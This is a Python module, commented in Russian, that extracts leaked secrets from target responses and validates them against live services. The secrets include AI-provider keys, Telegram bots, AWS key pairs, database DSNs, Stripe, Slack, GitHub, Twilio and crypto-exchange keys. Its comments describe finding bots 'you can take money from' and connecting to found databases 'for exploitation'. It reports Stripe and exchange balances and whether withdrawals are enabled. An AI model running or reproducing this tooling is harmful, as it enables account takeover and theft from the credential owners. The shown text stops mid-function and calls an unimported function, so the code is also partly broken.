# -*- coding: utf-8 -*-
"""Верификация найденных секретов: AI-ключи, telegram-боты, AWS, DSN.

Все проверки бесплатны и безопасны (без списания средств, read-only).
"""
import asyncio
import base64
import hashlib
import hmac
import re
import time
from datetime import datetime, timezone
from typing import Any
from urllib.parse import urlsplit

import aiohttp

# Извлечение ключей по уникальным префиксам провайдеров
KEY_EXTRACTORS: list[tuple[str, re.Pattern[str]]] = [
    ("anthropic", re.compile(r'\bsk-ant-api03-[A-Za-z0-9_-]{20,}')),
    ("openrouter", re.compile(r'\bsk-or-v1-[A-Za-z0-9]{40,}')),
    ("openai", re.compile(r'\bsk-(?:proj|svcacct)-[A-Za-z0-9_-]{40,}')),
    ("openai", re.compile(r'\bsk-[A-Za-z0-9]{48,}')),
    ("groq", re.compile(r'\bgsk_[A-Za-z0-9]{40,}')),
    ("gemini", re.compile(r'\bAIza[0-9A-Za-z_-]{35}')),
    ("huggingface", re.compile(r'\bhf_[A-Za-z0-9]{30,}')),
    ("xai", re.compile(r'\bxai-[A-Za-z0-9]{40,}')),
]

# Бесплатные проверочные эндпоинты (не генерируют токены)
PROVIDER_URLS = {
    "openai": "https://api.openai.com/v1/models",
    "anthropic": "https://api.anthropic.com/v1/models",
    "groq": "https://api.groq.com/openai/v1/models",
    # auth/key - единственный, кто отдаёт реальный баланс (limit/usage)
    "openrouter": "https://openrouter.ai/api/v1/auth/key",
    "huggingface": "https://huggingface.co/api/whoami-v2",
    "xai": "https://api.x.ai/v1/api-key",
}


def extract_ai_keys(text: str) -> list[tuple[str, str]]:
    """Извлекает пары (provider, key) из текста ответа."""
    found: list[tuple[str, str]] = []
    seen: set[str] = set()
    for provider, rx in KEY_EXTRACTORS:
        for m in rx.finditer(text):
            key = m.group(0)
            if key not in seen:
                seen.add(key)
                found.append((provider, key))
    return found


async def verify_ai_key(
    session: aiohttp.ClientSession,
    provider: str,
    key: str,
    proxy: str | None = None,
    timeout_s: float = 5.0,
) -> dict[str, Any]:
    """Проверяет ключ: valid / invalid / error + детали (баланс, где отдаётся)."""
    result: dict[str, Any] = {
        "provider": provider,
        "key": key,
        "status": "error",
        "detail": "",
    }
    try:
        if provider == "gemini":
            url = f"https://generativelanguage.googleapis.com/v1beta/models?key={key}"
            headers = {}
        else:
            url = PROVIDER_URLS[provider]
            if provider == "anthropic":
                headers = {"x-api-key": key, "anthropic-version": "2023-06-01"}
            else:
                headers = {"Authorization": f"Bearer {key}"}

        timeout = aiohttp.ClientTimeout(total=timeout_s)
        async with session.get(
            url, headers=headers, proxy=proxy, timeout=timeout
        ) as resp:
            if resp.status in (200, 201):
                result["status"] = "valid"
                if provider == "openrouter":
                    try:
                        data = (await resp.json()).get("data", {})
                        limit = data.get("limit")
                        if limit is None:
                            result["detail"] = (
                                f"free_tier={data.get('is_free_tier')} "
                                f"spent={data.get('usage')}"
                            )
                        else:
                            result["detail"] = (
                                f"limit={limit} spent={data.get('usage')} "
                                f"free_tier={data.get('is_free_tier')}"
                            )
                    except Exception:
                        pass
            elif resp.status in (401, 403) or (resp.status == 400 and provider == "gemini"):
                # Gemini отдаёт 400 для невалидных API-ключей
                result["status"] = "invalid"
                result["detail"] = f"HTTP {resp.status}"
            else:
                result["status"] = "error"
                result["detail"] = f"HTTP {resp.status}"
    except (aiohttp.ClientError, TimeoutError, OSError) as exc:
        result["detail"] = type(exc).__name__
    return result


# Telegram bot tokens: id:hash
TELEGRAM_BOT_RE = re.compile(r'\b(\d{8,10}):([A-Za-z0-9_-]{35})\b')


def extract_telegram_bots(text: str) -> list[str]:
    """Извлекает токены telegram-ботов из текста ответа."""
    return list(dict.fromkeys(m.group(0) for m in TELEGRAM_BOT_RE.finditer(text)))


# Платёжные команды telegram-бота (EN/RU)
MONEY_COMMAND_RE = re.compile(
    r'(?:pay|payout|withdraw|cash|balance|topup|top_up|deposit|stars|invoice|buy|replenish'
    r'|вывод|баланс|оплата|пополн|выплат|заработ|кошел)',
    re.I,
)


async def verify_telegram_bot(
    session: aiohttp.ClientSession,
    token: str,
    proxy: str | None = None,
    timeout_s: float = 5.0,
) -> dict[str, Any]:
    """Проверяет бота через getMe (бесплатно и безопасно).

    Дополнительно через getMyCommands ищет платёжные команды
    (вывод/баланс/оплата) - признак бот-кассы, с которой можно брать деньги.
    """
    result: dict[str, Any] = {
        "token": token,
        "status": "error",
        "username": "",
        "money": False,
        "money_commands": [],
    }
    timeout = aiohttp.ClientTimeout(total=timeout_s)
    try:
        async with session.get(
            f"https://api.telegram.org/bot{token}/getMe",
            proxy=proxy,
            timeout=timeout,
        ) as resp:
            if resp.status == 200:
                try:
                    data = await resp.json()
                except Exception:
                    data = {}
                if data.get("ok"):
                    result["status"] = "valid"
                    result["username"] = data.get("result", {}).get("username", "")
                else:
                    result["status"] = "invalid"
            elif resp.status in (401, 404):
                result["status"] = "invalid"
                result["detail"] = f"HTTP {resp.status}"
            else:
                result["status"] = "error"
                result["detail"] = f"HTTP {resp.status}"

        # Живой бот: ищем платёжные команды и описания
        if result["status"] == "valid":
            try:
                money_cmds: list[str] = []
                money_desc: list[str] = []
                async with session.get(
                    f"https://api.telegram.org/bot{token}/getMyCommands",
                    proxy=proxy,
                    timeout=timeout,
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        cmds = data.get("result") or []
                        money_cmds = [
                            c.get("command", "")
                            for c in cmds
                            if MONEY_COMMAND_RE.search(str(c.get("command", "")))
                            or MONEY_COMMAND_RE.search(str(c.get("description", "")))
                        ]
                # Описания бота часто прямо говорят о деньгах (вывод/баланс)
                for meth, field in (
                    ("getMyDescription", "description"),
                    ("getMyShortDescription", "short_description"),
                ):
                    async with session.get(
                        f"https://api.telegram.org/bot{token}/{meth}",
                        proxy=proxy,
                        timeout=timeout,
                    ) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            text = str((data.get("result") or {}).get(field) or "")
                            if text and MONEY_COMMAND_RE.search(text):
                                money_desc.append(text[:100])
                result["money_commands"] = money_cmds
                result["money_text"] = money_desc
                result["money"] = bool(money_cmds or money_desc)
            except (aiohttp.ClientError, TimeoutError):
                pass
    except (aiohttp.ClientError, TimeoutError, OSError) as exc:
        result["detail"] = type(exc).__name__
    return result


# AWS access key IDs (AKIA...)
AWS_KEY_RE = re.compile(r'\b(AKIA[0-9A-Z]{16})\b')


def extract_aws_keys(text: str) -> list[str]:
    """Извлекает AWS access key IDs из текста ответа."""
    return list(dict.fromkeys(AWS_KEY_RE.findall(text)))


# Пары access_key + secret_key в одном JSON-объекте (оба порядка полей)
AWS_KEYPAIR_RE = re.compile(
    r'"(?:aws_access_key_id|access_key_id|aws_access_key)"\s*:\s*"(AKIA[0-9A-Z]{16})"'
    r'[^{}]{0,400}?'
    r'"(?:aws_secret_access_key|secret_access_key|aws_secret_key)"\s*:\s*"([A-Za-z0-9/+=]{40})"',
    re.I,
)
AWS_KEYPAIR_RE_R = re.compile(
    r'"(?:aws_secret_access_key|secret_access_key|aws_secret_key)"\s*:\s*"([A-Za-z0-9/+=]{40})"'
    r'[^{}]{0,400}?'
    r'"(?:aws_access_key_id|access_key_id|aws_access_key)"\s*:\s*"(AKIA[0-9A-Z]{16})"',
    re.I,
)


def extract_aws_keypairs(text: str) -> list[tuple[str, str]]:
    """Извлекает пары (access_key, secret_key) из одного JSON-объекта."""
    pairs = [(m.group(1), m.group(2)) for m in AWS_KEYPAIR_RE.finditer(text)]
    pairs += [(m.group(2), m.group(1)) for m in AWS_KEYPAIR_RE_R.finditer(text)]
    return list(dict.fromkeys(pairs))


def _sigv4_auth(
    access_key: str, secret_key: str, amzdate: str, datestamp: str,
    body: str,
) -> str:
    """Authorization-заголовок SigV4 для POST sts.amazonaws.com (query protocol)."""
    import hashlib
    import hmac as hmac_mod

    def h(key: bytes, msg: str) -> bytes:
        return hmac_mod.new(key, msg.encode(), hashlib.sha256).digest()

    payload_hash = hashlib.sha256(body.encode()).hexdigest()
    canonical_headers = (
        'content-type:application/x-www-form-urlencoded\n'
        'host:sts.amazonaws.com\n'
        f'x-amz-date:{amzdate}\n'
    )
    signed_headers = 'content-type;host;x-amz-date'
    canonical_request = (
        f'POST\n/\n\n{canonical_headers}\n{signed_headers}\n{payload_hash}'
    )
    scope = f'{datestamp}/us-east-1/sts/aws4_request'
    string_to_sign = (
        'AWS4-HMAC-SHA256\n'
        f'{amzdate}\n{scope}\n'
        + hashlib.sha256(canonical_request.encode()).hexdigest()
    )
    k = h(('AWS4' + secret_key).encode(), datestamp)
    k = h(k, 'us-east-1')
    k = h(k, 'sts')
    k = h(k, 'aws4_request')
    signature = hmac_mod.new(k, string_to_sign.encode(), hashlib.sha256).hexdigest()
    return (
        f'AWS4-HMAC-SHA256 Credential={access_key}/{scope}, '
        f'SignedHeaders={signed_headers}, Signature={signature}'
    )


async def verify_aws_keypair(
    session: aiohttp.ClientSession,
    access_key: str,
    secret_key: str,
    proxy: str | None = None,
    timeout_s: float = 5.0,
) -> dict[str, Any]:
    """Проверяет пару AWS-ключей через STS GetCallerIdentity (SigV4).

    Бесплатно и безопасно: только читает identity (account ID, ARN).
    """
    result: dict[str, Any] = {
        "access_key": access_key, "status": "error",
        "account": "", "arn": "", "detail": "",
    }
    try:
        from datetime import datetime, timezone
        now = datetime.now(timezone.utc)
        amzdate = now.strftime('%Y%m%dT%H%M%SZ')
        datestamp = now.strftime('%Y%m%d')
        body = 'Action=GetCallerIdentity&Version=2011-06-15'
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Amz-Date': amzdate,
            'Authorization': _sigv4_auth(access_key, secret_key, amzdate, datestamp, body),
        }
        timeout = aiohttp.ClientTimeout(total=timeout_s)
        async with session.post(
            'https://sts.amazonaws.com/', data=body, headers=headers,
            proxy=proxy, timeout=timeout,
        ) as resp:
            if resp.status == 200:
                text = await resp.text()
                m = re.search(r'<Account>(\d+)</Account>', text)
                arn = re.search(r'<Arn>([^<]+)</Arn>', text)
                if m:
                    result["status"] = "valid"
                    result["account"] = m.group(1)
                    result["arn"] = arn.group(1) if arn else ""
                else:
                    result["detail"] = "no account in response"
            elif resp.status in (400, 401, 403, 404):
                result["status"] = "invalid"
                result["detail"] = f"HTTP {resp.status}"
            else:
                result["detail"] = f"HTTP {resp.status}"
    except (aiohttp.ClientError, TimeoutError, OSError) as exc:
        result["detail"] = type(exc).__name__
    return result


# DSN с кредами: postgres/mysql/mongodb/redis/amqp
DSN_RE = re.compile(
    r'\b(?:postgres(?:ql)?|mysql|mariadb|mongodb(?:\+srv)?|redis|amqp)://[^\s"\'<>]+@[^\s"\'<>]+',
    re.I,
)

DSN_DEFAULT_PORTS = {
    "postgresql": 5432, "postgres": 5432,
    "mysql": 3306, "mariadb": 3306,
    "mongodb": 27017, "mongodb+srv": 27017,
    "redis": 6379, "amqp": 5672,
}


def extract_dsns(text: str) -> list[str]:
    """Извлекает DSN с user:pass@ из текста ответа."""
    return list(dict.fromkeys(DSN_RE.findall(text)))


def _effective_dsn_host(host: str, target_host: str | None) -> tuple[str, bool]:
    """Хост для подключения: внутренние (localhost/docker) подменяем на IP цели.

    DSN вида postgres://user:pass@db:5432 виден изнутри контейнера цели -
    снаружи этот же сервис обычно доступен на публичном IP самого хоста.
    """
    h = (host or "").strip().lower()
    if not h:
        return h, False
    internal = (
        h in ("localhost", "::1", "host.docker.internal")
        or h.startswith("127.")
        or "." not in h  # docker service name: db, postgres, redis...
    )
    if not internal:
        try:
            import ipaddress
            ip = ipaddress.ip_address(h)
            internal = ip.is_private or ip.is_loopback or ip.is_link_local
        except ValueError:
            internal = False
    if internal and target_host:
        return target_host, True
    return host, False


async def check_dsn(
    dsn: str, timeout_s: float = 5.0, target_host: str | None = None,
) -> dict[str, Any]:
    """Проверяет DSN: доступен ли хост, работают ли креды (postgres).

    Внутренние хосты (localhost/docker) переподключаются на публичный IP
    цели target_host - там обычно выставлен тот же сервис.
    TCP-коннект идёт напрямую (asyncpg не умеет прокси) - это нормально:
    к найденной БД всё равно придётся подключаться для эксплуатации.
    """
    result: dict[str, Any] = {
        "dsn": dsn, "status": "unreachable", "error": "",
        "connect_host": "", "via": "",
    }
    try:
        u = urlsplit(dsn)
        host = u.hostname or ""
        connect_host, rewritten = _effective_dsn_host(host, target_host)
        result["connect_host"] = connect_host
        result["via"] = target_host if rewritten else ""
        port = u.port or DSN_DEFAULT_PORTS.get(u.scheme.lower(), 0)
        if not connect_host or not port:
            result["error"] = "bad dsn"
            return result

        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(connect_host, port), timeout=timeout_s
            )
            writer.close()
            await writer.wait_closed()
        except (OSError, asyncio.TimeoutError) as exc:
            result["error"] = type(exc).__name__
            return result

        # Полная проверка кредов - только postgres (asyncpg уже в зависимостях)
        if u.scheme.lower() in ("postgres", "postgresql") and u.username and u.password:
            # Пересобираем DSN с эффективным хостом (без query)
            auth = u.username
            if u.password is not None:
                auth += ":" + u.password
            new_netloc = f"{auth}@{connect_host}" + (f":{u.port}" if u.port else "")
            clean_dsn = urlunsplit((u.scheme, new_netloc, u.path or "/", "", ""))
            for ssl_arg in (None, False):
                try:
                    import asyncpg
                    conn = await asyncio.wait_for(
                        asyncpg.connect(dsn=clean_dsn, timeout=timeout_s, ssl=ssl_arg),
                        timeout=timeout_s + 2,
                    )
                    await conn.close()
                    result["status"] = "auth_ok"
                    return result
                except Exception as exc:
                    result["error"] = type(exc).__name__
            result["status"] = "reachable"
        else:
            result["status"] = "reachable"
    except Exception as exc:
        result["error"] = type(exc).__name__
    return result


# --- Универсальная верификация сервисных секретов (read-only) ---

SECRET_EXTRACTORS: list[tuple[str, re.Pattern[str]]] = [
    ("stripe", re.compile(r'\b(?:sk|rk)_live_[0-9a-zA-Z]{24,}\b')),
    ("slack", re.compile(r'\bxox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}\b')),
    ("discord", re.compile(r'\b[MN][A-Za-z\d]{23,}\.[\w-]{6}\.[\w-]{25,}\b')),
    ("github", re.compile(r'\bgh[pousr]_[A-Za-z0-9]{36,}\b')),
    ("gitlab", re.compile(r'\bglpat-[A-Za-z0-9\-]{20,}\b')),
    ("mailgun", re.compile(r'\bkey-[0-9a-f]{32}\b')),
    ("sendgrid", re.compile(r'\bSG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}\b')),
    ("npm", re.compile(r'\bnpm_[A-Za-z0-9]{36}\b')),
    ("dropbox", re.compile(r'\bsl\.[A-Za-z0-9_-]{130,}\b')),
]


def extract_secrets(text: str) -> list[tuple[str, str]]:
    """Извлекает сервисные секреты (stripe/slack/discord/github/...)."""
    out: list[tuple[str, str]] = []
    for kind, rx in SECRET_EXTRACTORS:
        for v in rx.findall(text):
            out.append((kind, v))
    return list(dict.fromkeys(out))


async def verify_secret(
    session: aiohttp.ClientSession,
    kind: str,
    value: str,
    proxy: str | None = None,
    timeout_s: float = 5.0,
) -> dict[str, Any]:
    """Проверяет сервисный секрет read-only запросом к провайдеру.

    stripe: /v1/balance отдаёт реальный баланс (деньги!), slack: auth.test,
    discord/githab/gitlab/mailgun/sendgrid/npm/dropbox: whoami-эндпоинты.
    """
    result: dict[str, Any] = {
        "kind": kind, "value": value, "status": "error", "detail": "",
    }
    timeout = aiohttp.ClientTimeout(total=timeout_s)
    try:
        if kind == "stripe":
            async with session.get(
                "https://api.stripe.com/v1/balance",
                headers={"Authorization": f"Bearer {value}"},
                proxy=proxy, timeout=timeout,
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    amounts = [
                        f"{b.get('amount', 0) / 100:.2f} {b.get('currency', '')}"
                        for b in (data.get("available") or [])[:3]
                    ]
                    result["status"] = "valid"
                    result["detail"] = "balance: " + (", ".join(amounts) if amounts else "0")
                elif resp.status == 401:
                    result["status"] = "invalid"
                    result["detail"] = "HTTP 401"
                elif resp.status == 403:
                    # ключ жив, но нет права на чтение баланса (restricted)
                    result["status"] = "valid"
                    result["detail"] = "no balance permission"
                else:
                    result["detail"] = f"HTTP {resp.status}"
        elif kind == "slack":
            # slack возвращает HTTP 200 c ok:false для битого токена
            async with session.get(
                "https://slack.com/api/auth.test",
                headers={"Authorization": f"Bearer {value}"},
                proxy=proxy, timeout=timeout,
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if data.get("ok"):
                        result["status"] = "valid"
                        result["detail"] = f"user={data.get('user', '?')} team={data.get('team', '?')}"
                    else:
                        result["status"] = "invalid"
                        result["detail"] = str(data.get("error", ""))
                else:
                    result["detail"] = f"HTTP {resp.status}"
        elif kind == "discord":
            async with session.get(
                "https://discord.com/api/v10/users/@me",
                headers={"Authorization": f"Bot {value}"},
                proxy=proxy, timeout=timeout,
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result["status"] = "valid"
                    result["detail"] = f"@{data.get('username', '?')}"
                elif resp.status == 401:
                    result["status"] = "invalid"
                    result["detail"] = "HTTP 401"
                else:
                    result["detail"] = f"HTTP {resp.status}"
        elif kind in ("github", "gitlab"):
            url = (
                "https://api.github.com/user"
                if kind == "github"
                else "https://gitlab.com/api/v4/user"
            )
            headers = {
                "Authorization": f"Bearer {value}",
                "Accept": "application/vnd.github+json" if kind == "github" else "application/json",
            }
            async with session.get(url, headers=headers, proxy=proxy, timeout=timeout) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result["status"] = "valid"
                    result["detail"] = str(data.get("login") or data.get("username") or "?")
                elif resp.status == 401:
                    result["status"] = "invalid"
                    result["detail"] = "HTTP 401"
                else:
                    result["detail"] = f"HTTP {resp.status}"
        elif kind == "mailgun":
            async with session.get(
                "https://api.mailgun.net/v3/domains",
                auth=aiohttp.BasicAuth("api", value),
                proxy=proxy, timeout=timeout,
            ) as resp:
                if resp.status == 200:
                    result["status"] = "valid"
                    result["detail"] = "domains ok"
                elif resp.status == 401:
                    result["status"] = "invalid"
                    result["detail"] = "HTTP 401"
                else:
                    result["detail"] = f"HTTP {resp.status}"
        elif kind == "sendgrid":
            async with session.get(
                "https://api.sendgrid.com/v3/scopes",
                headers={"Authorization": f"Bearer {value}"},
                proxy=proxy, timeout=timeout,
            ) as resp:
                if resp.status == 200:
                    result["status"] = "valid"
                    result["detail"] = "scopes ok"
                elif resp.status == 401:
                    result["status"] = "invalid"
                    result["detail"] = "HTTP 401"
                else:
                    result["detail"] = f"HTTP {resp.status}"
        elif kind == "npm":
            async with session.get(
                "https://registry.npmjs.org/-/user/org.couchdb.user:me",
                headers={"Authorization": f"Bearer {value}"},
                proxy=proxy, timeout=timeout,
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result["status"] = "valid"
                    result["detail"] = str(data.get("name", "?"))
                elif resp.status == 401:
                    result["status"] = "invalid"
                    result["detail"] = "HTTP 401"
                else:
                    result["detail"] = f"HTTP {resp.status}"
        elif kind == "dropbox":
            # POST, но строго read-only (get_current_account)
            async with session.post(
                "https://api.dropboxapi.com/2/users/get_current_account",
                headers={"Authorization": f"Bearer {value}"},
                json=None,
                proxy=proxy, timeout=timeout,
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result["status"] = "valid"
                    result["detail"] = str(data.get("email", "?"))
                elif resp.status == 401:
                    result["status"] = "invalid"
                    result["detail"] = "HTTP 401"
                else:
                    result["detail"] = f"HTTP {resp.status}"
        else:
            result["detail"] = f"unknown kind {kind}"
    except (aiohttp.ClientError, TimeoutError, OSError) as exc:
        result["detail"] = type(exc).__name__
    return result


# ---------------------------------------------------------------------------
# Twilio: пара AccountSid (AC/SK) + AuthToken, HTTP Basic (read-only)
# ---------------------------------------------------------------------------
TWILIO_PAIR_RE = re.compile(
    r'"(?:twilioAccountSid|accountSid|account_sid|twilio_sid)"\s*:\s*"((?:SK|AC)[0-9a-fA-F]{32})"'
    r'[^{}]{0,400}?'
    r'"(?:twilioAuthToken|authToken|auth_token|twilio_auth_token)"\s*:\s*"([A-Za-z0-9]{32})"')
TWILIO_PAIR_RE_R = re.compile(
    r'"(?:twilioAuthToken|authToken|auth_token|twilio_auth_token)"\s*:\s*"([A-Za-z0-9]{32})"'
    r'[^{}]{0,400}?'
    r'"(?:twilioAccountSid|accountSid|account_sid|twilio_sid)"\s*:\s*"((?:SK|AC)[0-9a-fA-F]{32})"')


def extract_twilio_pairs(text: str) -> list[tuple[str, str]]:
    """(sid, token) пары Twilio из JSON-подобного текста."""
    pairs: list[tuple[str, str]] = []
    for m in TWILIO_PAIR_RE.finditer(text):
        if (m.group(1), m.group(2)) not in pairs:
            pairs.append((m.group(1), m.group(2)))
    for m in TWILIO_PAIR_RE_R.finditer(text):
        if (m.group(2), m.group(1)) not in pairs:
            pairs.append((m.group(2), m.group(1)))
    return pairs


async def verify_twilio_pair(session: aiohttp.ClientSession, sid: str,
                             token: str, proxy: str | None = None,
                             timeout_s: float = 5.0) -> dict[str, Any]:
    """Twilio REST API = HTTP Basic sid:token, GET Accounts.json (read-only)."""
    result: dict[str, Any] = {"sid": sid[:10] + "…", "status": "unknown", "detail": ""}
    try:
        async with session.get(
            "https://api.twilio.com/2010-04-01/Accounts.json?PageSize=1",
            auth=aiohttp.BasicAuth(sid, token),
            proxy=proxy, timeout=timeout_s,
        ) as resp:
            if resp.status == 200:
                data = await resp.json()
                accs = data.get("accounts") or [{}]
                result["status"] = "valid"
                result["detail"] = str(accs[0].get("friendly_name") or accs[0].get("status") or "?")
            elif resp.status == 401:
                result["status"] = "invalid"
                result["detail"] = "HTTP 401"
            else:
                result["detail"] = f"HTTP {resp.status}"
    except (aiohttp.ClientError, TimeoutError, OSError) as exc:
        result["detail"] = type(exc).__name__
    return result


# ---------------------------------------------------------------------------
# Twitter/X: app-only bearer токен (контекстное извлечение)
# ---------------------------------------------------------------------------
def extract_twitter_bearers(text: str, limit: int = 2) -> list[str]:
    """Bearer AAAAAAAA… рядом со словом twitter (контекст отсекает base64-мусор)."""
    out: list[str] = []
    for m in re.finditer(r'(?i)twitter', text):
        window = text[max(0, m.start() - 250): m.start() + 350]
        b = re.search(r'\b(A{10}[A-Za-z0-9%]{30,})', window)
        if b and b.group(1).rstrip("%") not in out:
            # % в хвосте — артефакт url-encoding, twitter на нём отдаёт 500
            out.append(b.group(1).rstrip("%"))
        if len(out) >= limit:
            break
    return out


async def verify_twitter_bearer(session: aiohttp.ClientSession, token: str,
                               proxy: str | None = None,
                               timeout_s: float = 5.0) -> dict[str, Any]:
    """GET rate_limit_status работает с app-only bearer, квоту не тратит."""
    result: dict[str, Any] = {"status": "unknown", "detail": ""}
    try:
        async with session.get(
            "https://api.twitter.com/1.1/application/rate_limit_status.json",
            headers={"Authorization": f"Bearer {token}"},
            proxy=proxy, timeout=timeout_s,
        ) as resp:
            if resp.status in (200, 429):  # 429 = токен валиден, лимит исчерпан
                result["status"] = "valid"
                result["detail"] = "app bearer"
            elif resp.status in (400, 401, 403):
                result["status"] = "invalid"
                result["detail"] = f"HTTP {resp.status}"
            else:
                result["detail"] = f"HTTP {resp.status}"
    except (aiohttp.ClientError, TimeoutError, OSError) as exc:
        result["detail"] = type(exc).__name__
    return result


# ---------------------------------------------------------------------------
# Биржевые API-ключи: binance/bybit/okx/kucoin (HMAC-подпись, read-only:
# баланс + право вывода — связка «сколько денег лежит и можно ли вывести»)
# ---------------------------------------------------------------------------
EXCHANGE_CTX_RE = re.compile(r'(?i)\b(binance|bybit|okx|kucoin)\b')
_EX_KEY_RE = re.compile(
    r'"(?:api[_-]?key|apiKey|api[_-]?id|access[_-]?key|exchange[_-]?key)"\s*:\s*"([A-Za-z0-9]{16,64})"', re.I)
_EX_SECRET_RE = re.compile(
    r'"(?:api[_-]?secret|apiSecret|secret(?:[_-]?key)?)"\s*:\s*"([A-Za-z0-9+/=_-]{16,64})"', re.I)
_EX_PASS_RE = re.compile(r'"(?:passphrase|pass_phrase)"\s*:\s*"([^"]{6,64})"', re.I)


def extract_exchange_pairs(text: str, limit: int = 3) -> list[dict[str, Any]]:
    """Пары api_key+secret (для okx/kucoin + passphrase) рядом с названием биржи."""
    out: list[dict[str, Any]] = []
    seen: set[tuple[str, str, str]] = set()
    for m in EXCHANGE_CTX_RE.finditer(text):
        window = text[max(0, m.start() - 600): m.start() + 900]
        km = _EX_KEY_RE.search(window)
        sm = _EX_SECRET_RE.search(window)
        if not (km and sm) or km.group(1) == sm.group(1):
            continue
        pm = _EX_PASS_RE.search(window)
        exchange = m.group(1).lower()
        sig = (exchange, km.group(1), sm.group(1))
        if sig in seen:
            continue
        seen.add(sig)
        out.append({"exchange": exchange, "key": km.group(1), "secret": sm.group(1),
                   "passphrase": pm.group(1) if pm else None})
        if len(out) >= limit:
            break
    return out


def _hmac_hex(secret: str, msg: str) -> str:
    return hmac.new(secret.encode(), msg.encode(), hashlib.sha256).hexdigest()


def _hmac_b64(secret: bytes, msg: str) -> str:
    return base64.b64encode(hmac.new(secret, msg.encode(), hashlib.sha256).digest()).decode()


def _ex_error(status: int) -> dict[str, Any]:
    return {"status": "invalid" if status in (400, 401, 403) else "unknown",
            "detail": f"HTTP {status}", "balances": [], "withdraw_enabled": None}


async def _verify_binance(session: aiohttp.ClientSession, key: str, secret: str,
                          proxy: str | None, timeout_s: float) -> dict[str, Any]:
    headers = {"X-MBX-APIKEY": key}
    q = f"timestamp={int(time.time() * 1000)}&recvWindow=5000"
    async with session.get(
        f"https://api.binance.com/api/v3/account?{q}&signature={_hmac_hex(secret, q)}",
        headers=headers, proxy=proxy, timeout=timeout_s,
    ) as resp:
        if resp.status != 200:
            return _ex_error(resp.status)
        data = await resp.json()
        balances = [
            f"{b['asset']}={float(b['free'] or 0) + float(b['locked'] or 0):.6g}"
            for b in data.get("balances") or []
            if float(b.get("free") or 0) + float(b.get("locked") or 0) > 0
        ]
    # Права ключа: enableWithdrawals (sapi может быть выключен — не критично)
    q2 = f"timestamp={int(time.time() * 1000)}&recvWindow=5000"
    withdraw: bool | None = None
    try:
        async with session.get(
            f"https://api.binance.com/sapi/v1/account/apiRestrictions?{q2}&signature={_hmac_hex(secret, q2)}",
            headers=headers, proxy=proxy, timeout=timeout_s,
        ) as resp:
            if resp.status == 200:
                withdraw = bool((await resp.json()).get("enableWithdrawals"))
    except (aiohttp.ClientError, TimeoutError, OSError):
        pass
    detail = ", ".join(balances[:4]) if balances else "баланс 0"
    if withdraw is not None:
        detail += "; вывод: вкл" if withdraw else "; вывод: выкл"
    return {"status": "valid", "balances": balances[:8], "withdraw_enabled": withdraw, "detail": detail}


async def _verify_bybit(session: aiohttp.ClientSession, key: str, secret: str,
                       proxy: str | None, timeout_s: float) -> dict[str, Any]:
    ts = str(int(time.time() * 1000))
    qs = "accountType=UNIFIED"
    sign = _hmac_hex(secret, ts + key + "5000" + qs)
    headers = {"X-BAPI-API-KEY": key, "X-BAPI-TIMESTAMP": ts,
               "X-BAPI-RECV-WINDOW": "5000", "X-BAPI-SIGN": sign}
    async with session.get(
        f"https://api.bybit.com/v5/account/wallet-balance?{qs}",
        headers=headers, proxy=proxy, timeout=timeout_s,
    ) as resp:
        if resp.status != 200:
            return _ex_error(resp.status)
        data = await resp.json()
        if data.get("retCode") != 0:
            return {"status": "invalid", "detail": f"retCode {data.get('retCode')}",
                    "balances": [], "withdraw_enabled": None}
        coins = []
        for acc in (data.get("result") or {}).get("list") or []:
            for c in acc.get("coin") or []:
                wb = float(c.get("walletBalance") or 0)
                if wb > 0:
                    coins.append(f"{c.get('coin')}={wb:.6g}")
    # Права ключа: /v5/user/query-api (может отсутствовать у старых ключей)
    ts2 = str(int(time.time() * 1000))
    sign2 = _hmac_hex(secret, ts2 + key + "5000")
    headers2 = {"X-BAPI-API-KEY": key, "X-BAPI-TIMESTAMP": ts2,
                "X-BAPI-RECV-WINDOW": "5000", "X-BAPI-SIGN": sign2}
    withdraw: bool | None = None
    try:
        async with session.get(
            "https://api.bybit.com/v5/user/query-api",
            headers=headers2, proxy=proxy, timeout=timeout_s,
        ) as resp:
            if resp.status == 200:
                body = await resp.json(content_type=None)
                perms = str((body.get("result") or {}).get("permissions") or body.get("result") or "")
                if perms:
                    compact = re.sub(r'[\s"]', "", perms)
                    withdraw = "withdraw:true" in compact.lower()
    except (aiohttp.ClientError, TimeoutError, OSError):
        pass
    detail = ", ".join(coins[:4]) if coins else "баланс 0"
    if withdraw is not None:
        detail += "; вывод: вкл" if withdraw else "; вывод: выкл"
    return {"status": "valid", "balances": coins[:8], "withdraw_enabled": withdraw, "detail": detail}


async def _verify_okx(session: aiohttp.ClientSession, key: str, secret: str,
                      passphrase: str | None, proxy: str | None,
                      timeout_s: float) -> dict[str, Any]:
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
    path = "/api/v5/account/balance"
    sign = _hmac_b64(secret.encode(), ts + "GET" + path)
    headers = {"OK-ACCESS-KEY": key, "OK-ACCESS-SIGN": sign,
               "OK-ACCESS-TIMESTAMP": ts, "OK-ACCESS-PASSPHRASE": passphrase or ""}
    async with session.get(
        "https://www.okx.com" + path,
        headers=headers, proxy=proxy, timeout=timeout_s,
    ) as resp:
        if resp.status != 200:
            return _ex_error(resp.status)
        data = await resp.json()
        if str(data.get("code")) != "0":
            return {"status": "invalid", "detail": f"code {data.get('code')}",
                    "balances": [], "withdraw_enabled": None}
        coins = []
        for d in data.get("data") or []:
            for dt in d.get("details") or []:
                bal = float(dt.get("bal") or 0)
                if bal > 0:
                    coins.append(f"{dt.get('ccy')}={bal:.6g}")
    return {"status": "valid", "balances": coins[:8], "withdraw_enabled": None,
            "detail": ", ".join(coins[:4]) if coins else "баланс 0"}


async def _verify_kucoin(session: aiohttp.ClientSession, key: str, secret: str,
                        passphrase: str | None, proxy: str | None,
                        timeout_s: float) -> dict[str, Any]:
